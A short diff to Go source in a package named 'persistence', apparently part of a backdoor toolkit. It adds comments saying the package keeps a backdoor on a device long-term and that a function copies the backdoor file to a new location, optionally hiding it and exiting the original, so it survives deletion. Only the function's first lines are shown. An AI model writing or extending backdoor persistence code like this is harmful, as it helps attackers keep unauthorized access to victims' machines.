@@ -1,3 +1,4 @@
+// Package for maintaining backdoor on device for long periods of time.
 package persistence
 
 import (
@@ -7,6 +8,9 @@ import (
 	"github.com/iIIusi0n/backkit/utils"
 )
 
+// Copy current backdoor file to another location to prepare for someone erasing the current file.
+// If u set change as true, current backdoor exited after run copied file.
+// If u set hide as true, copied file will be hid.
 func AddCopyPersistence(path string, change, hide bool) error {
 	currentPath, err := utils.GetCurrentPath()
 	if err != nil {
